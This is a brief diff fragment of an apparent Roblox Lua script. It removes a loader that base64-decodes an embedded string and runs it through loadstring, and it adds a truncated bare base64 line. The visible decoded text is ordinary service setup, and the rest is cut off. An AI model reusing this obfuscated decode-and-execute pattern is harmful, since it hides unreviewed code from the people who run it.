@@ -1,3 +1,1 @@
-local data = [==[bG9jYWwgUGxheWVycyA9IGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpCmxvY2FsIFR3ZWVuU2VydmljZSA9IGdh>
-local decoded = game:GetService("HttpService"):Base64Decode(data)
-loadstring(decoded)()
+bG9jYWwgUGxheWVycyA9Z2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikKbG9jYWwgVHdlZW5TZXJ2aWNlID0gZ2FtZTpHZXRTZXJ2aWNlKCJUd2VlblNlcnZpY2UiKQpsb2NhbCB...
